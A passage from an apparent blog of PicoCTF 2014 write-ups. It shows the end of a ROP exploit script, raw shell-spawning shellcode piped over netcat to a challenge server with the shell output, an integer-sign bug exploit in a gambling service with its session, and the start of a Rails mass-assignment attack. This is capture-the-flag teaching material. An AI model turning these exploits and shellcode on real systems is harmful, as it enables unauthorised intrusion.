</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popecx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'><span class="c"># ebx = fd = stdin</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popebx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="c"># edx = size of shellcode (set to 100)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
</span><span class='line'><span class="c"># call syscall int 0x80</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">int80h</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># return to 0xf000000</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">popedx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">BASE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, this was used with <a href="http://shell-storm.org/shellcode/files/shellcode-547.php">a slightly modified shellcode</a>. This shellcode uses <code>execve</code> to run <code>/bin/ash</code>; I changed it to run <code>/bin//sh</code>. The shellcode has to be supplied seperately on the command line; I could not get the exploit to work if the shellcode was printed from <code>ropsploit.py</code>. The following landed us a shell on the remote server (again, using <code>cat</code> to keep the shell alive):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/hardcorrop<span class="nv">$ </span><span class="o">(</span>python ropsploit.py<span class="p">;</span> python -c <span class="s1">&#39;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80&quot;&#39;</span><span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> nc vuln2014.picoctf.com 4000
</span><span class='line'>yo, what<span class="err">&#39;</span>s up?
</span><span class='line'>ROP <span class="nb">time</span>!
</span><span class='line'>ls -al
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x    <span class="m">2</span> root     root          <span class="m">4096</span> Oct <span class="m">28</span> 17:55 .
</span><span class='line'>drwxr-xr-x    <span class="m">3</span> root     root          <span class="m">4096</span> Oct  <span class="m">5</span> 17:33 ..
</span><span class='line'>-rw-r--r--    <span class="m">1</span> root     root            <span class="m">21</span> Oct  <span class="m">5</span> 17:44 flag
</span><span class='line'>-rwxr-xr-x    <span class="m">1</span> root     root         <span class="m">11266</span> Oct  <span class="m">6</span> 01:13 hardcore_rop
</span><span class='line'>cat flag
</span><span class='line'>hard_as_PIE_amirite?
</span></code></pre></td></tr></table></div></figure>


<p>And there&rsquo;s the flag! A very fun challenge!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PicoCTF Write-Ups]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/"/>
    <updated>2014-11-06T22:52:14+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups</id>
    <content type="html"><![CDATA[<p>We managed to grab <em>all</em> of PicoCTF the flags and we ended with a 6105 point total score! Here are writeups of bitpuzzle, crudecrypt, low_entropy, makeaface, massive_fail, netsino, nevernote, no_overflow, obfuscation and web-interception. Lots of binary exploitation, reverse engineering and even some crypto!</p>

<!--more-->


<h1>Netsino (120 points)</h1>

<p><code>
Daedalus seems to have ties to a shady online gambling boss. Maybe if
you beat him at his own game, you can persuade him to share some useful
info. The server is running on vuln2014.picoctf.com:4547 and the source
code can be found here.
</code></p>

<p>We are presented with an online gambling program. You randomly get some cash and have to gamble against the boss. The following code takes your betsize:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">long</span> <span class="nf">getbet</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You&#39;ve got $%lu. How much you wanna bet on this next toss?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">player_cash</span><span class="p">);</span>
</span><span class='line'>        <span class="kt">long</span> <span class="n">bet</span> <span class="o">=</span> <span class="n">getnum</span><span class="p">();</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">bet</span> <span class="o">&lt;=</span> <span class="n">player_cash</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">bet</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Yerr can&#39;t bet more than ya got!&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The object is to win all the boss&#8217; money, so he&rsquo;ll give you the flag. Unfortunately, the program is coded pretty securely. Furthermore, the odds of winning aren&rsquo;t favorable. Luckily for us, the program makes a mistake when reading in the betsize. If we supply a large enough value, then the number being read will be negative. The program does not check for this. So let&rsquo;s supply <code>0xf0000000</code>, which is 4026531840. For the c program, however, it will be a negative number. Thus, the betsize check will pass, because -268435445 is less than your total amount. Next, all we have to do is lose:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">play</span><span class="p">(</span><span class="kt">long</span> <span class="n">choice</span><span class="p">,</span> <span class="kt">long</span> <span class="n">bet</span><span class="p">,</span> <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="c1">//...snip...</span>
</span><span class='line'>        <span class="k">case</span> <span class="mi">5</span><span class="o">:</span> <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">y</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">player_cash</span> <span class="o">+=</span> <span class="mi">36</span><span class="o">*</span><span class="n">bet</span><span class="p">;</span>
</span><span class='line'>                <span class="n">boss_cash</span> <span class="o">-=</span> <span class="mi">36</span><span class="o">*</span><span class="n">bet</span><span class="p">;</span>
</span><span class='line'>                <span class="n">puts</span><span class="p">(</span><span class="n">wins</span><span class="p">[</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">3</span><span class="o">+</span><span class="mi">7</span><span class="p">]);</span>
</span><span class='line'>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">puts</span><span class="p">(</span><span class="n">loses</span><span class="p">[</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">3</span><span class="o">+</span><span class="mi">7</span><span class="p">]);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By betting on snake-eyes (a very slim chance of that happening), the program will subtract the betsize times 36 from our cash and add that same amount to the boss&#8217; money. However, we supplied a very large negative number for the betsize, meaning that we actually <em>get</em> money and the boss loses money. Rinse &amp; repeat this a couple of times to get the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">nc</span> <span class="n">vuln2014</span><span class="p">.</span><span class="n">picoctf</span><span class="p">.</span><span class="n">com</span> <span class="mi">4547</span>
</span><span class='line'><span class="n">Arr</span><span class="p">,</span> <span class="n">git</span> <span class="n">ye</span> <span class="n">into</span> <span class="n">me</span> <span class="n">casio</span><span class="p">,</span> <span class="n">the</span> <span class="n">hottest</span> <span class="n">gamblin</span><span class="err">&#39;</span> <span class="n">sensation</span> <span class="n">on</span> <span class="n">the</span> <span class="n">net</span><span class="o">!</span>
</span><span class='line'><span class="n">Here</span><span class="p">,</span> <span class="n">have</span> <span class="n">a</span> <span class="n">fiver</span><span class="p">,</span> <span class="n">and</span> <span class="n">let</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">gamble</span><span class="o">!</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">5.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">5</span> <span class="mi">3</span>
</span><span class='line'><span class="n">Snake</span> <span class="n">eyes</span><span class="o">!</span> <span class="p">...</span><span class="n">not</span><span class="p">.</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">268435461.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">5</span> <span class="mi">4</span>
</span><span class='line'><span class="n">You</span> <span class="n">seem</span> <span class="n">to</span> <span class="n">enjoy</span> <span class="n">loosing</span><span class="p">.</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">536870917.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">2</span> <span class="mi">1</span>
</span><span class='line'><span class="n">Snake</span> <span class="n">eyes</span><span class="o">!</span> <span class="p">...</span><span class="n">not</span><span class="p">.</span>
</span><span class='line'><span class="n">You</span><span class="err">&#39;</span><span class="n">ve</span> <span class="n">got</span> <span class="err">$</span><span class="mf">805306373.</span> <span class="n">How</span> <span class="n">much</span> <span class="n">you</span> <span class="n">wanna</span> <span class="n">bet</span> <span class="n">on</span> <span class="n">this</span> <span class="n">next</span> <span class="n">toss</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">4026531840</span>
</span><span class='line'><span class="mi">1</span><span class="o">:</span> <span class="n">EVEN</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">4026531840</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">even</span><span class="p">.</span>
</span><span class='line'><span class="mi">2</span><span class="o">:</span> <span class="n">ODDS</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="k">if</span> <span class="n">both</span> <span class="n">dice</span> <span class="n">roll</span> <span class="n">odd</span><span class="p">.</span>
</span><span class='line'><span class="mi">3</span><span class="o">:</span> <span class="n">HIGH</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2952790016</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="mi">10</span> <span class="n">or</span> <span class="n">more</span><span class="p">.</span>
</span><span class='line'><span class="mi">4</span><span class="o">:</span> <span class="n">FOUR</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">2147483648</span> <span class="k">if</span> <span class="n">the</span> <span class="n">dice</span> <span class="n">sum</span> <span class="n">to</span> <span class="n">four</span><span class="p">.</span>
</span><span class='line'><span class="mi">5</span><span class="o">:</span> <span class="n">EYES</span><span class="p">.</span> <span class="n">Win</span> <span class="n">your</span> <span class="n">bet</span> <span class="n">back</span> <span class="n">plus</span> <span class="n">an</span> <span class="n">additional</span> <span class="err">$</span><span class="mi">3489660928</span> <span class="n">on</span> <span class="n">snake</span> <span class="n">eyes</span><span class="p">.</span>
</span><span class='line'><span class="n">What</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">it</span> <span class="n">be</span><span class="o">?</span>
</span><span class='line'><span class="o">&gt;</span> <span class="mi">5</span>
</span><span class='line'><span class="n">Lets</span> <span class="n">rock</span> <span class="sc">&#39;n&#39;</span> <span class="n">roll</span><span class="o">!</span>
</span><span class='line'><span class="mi">4</span> <span class="mi">3</span>
</span><span class='line'><span class="n">Like</span> <span class="n">that</span> <span class="n">was</span> <span class="n">ever</span> <span class="n">gonna</span> <span class="n">happen</span><span class="p">.</span>
</span><span class='line'><span class="n">Great</span><span class="p">,</span> <span class="n">I</span><span class="err">&#39;</span><span class="n">m</span> <span class="n">fresh</span> <span class="n">outta</span> <span class="n">cash</span><span class="p">.</span> <span class="n">Take</span> <span class="n">this</span> <span class="n">flag</span> <span class="n">instead</span><span class="p">.</span>
</span><span class='line'><span class="n">i_wish_real_casinos_had_this_bug</span>
</span><span class='line'><span class="n">Git</span> <span class="n">outta</span> <span class="n">here</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<h1>Massive Fail (120 points)</h1>

<p><code>Fed up with their recent PHP related issues, Daedalus Corp. has switched their website to run on Ruby on Rails (version 3.1.0) instead. Their brand new registration page does not seem like much of an improvement though... [Source].</code></p>

<p>We&rsquo;re given the source to a Ruby on Rails website. We need to register as an admin to get the flag. The interesting bit is in <code>db/schema.rb</code> and <code>app/controller/user_controller.rb</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">ActiveRecord</span><span class="o">::</span><span class="n">Schema</span><span class="p">.</span><span class="n">define</span><span class="p">(</span><span class="o">:</span><span class="n">version</span> <span class="o">=&gt;</span> <span class="mi">20141008175655</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">create_table</span> <span class="s">&quot;users&quot;</span><span class="p">,</span> <span class="o">:</span><span class="n">force</span> <span class="o">=&gt;</span> <span class="nb">true</span> <span class="k">do</span> <span class="o">|</span><span class="n">t</span><span class="o">|</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">string</span>   <span class="s">&quot;username&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">string</span>   <span class="s">&quot;password&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">string</span>   <span class="s">&quot;name&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">boolean</span>  <span class="s">&quot;is_admin&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">datetime</span> <span class="s">&quot;created_at&quot;</span>
</span><span class='line'>    <span class="n">t</span><span class="p">.</span><span class="n">datetime</span> <span class="s">&quot;updated_at&quot;</span>
</span><span class='line'>  <span class="n">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">class</span> <span class="n">UserController</span> <span class="o">&lt;</span> <span class="n">ApplicationController</span>
</span><span class='line'>  <span class="n">def</span> <span class="k">register</span>
</span><span class='line'>  <span class="n">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">def</span> <span class="n">create</span>
</span><span class='line'>    <span class="cp"># User.new creates a new user according to ALL the parameters</span>
</span><span class='line'>    <span class="err">@</span><span class="n">new_user</span> <span class="o">=</span> <span class="n">User</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="o">:</span><span class="n">user</span><span class="p">])</span>
</span><span class='line'>    <span class="err">@</span><span class="n">new_user</span><span class="p">.</span><span class="n">save</span>
</span><span class='line'>  <span class="n">end</span>
</span><span class='line'><span class="n">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>The application registers the user using <em>ALL</em> supplied parameters. So let&rsquo;s supply a few more, shall we? Download the registration page and &ldquo;tweak&rdquo; it a bit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
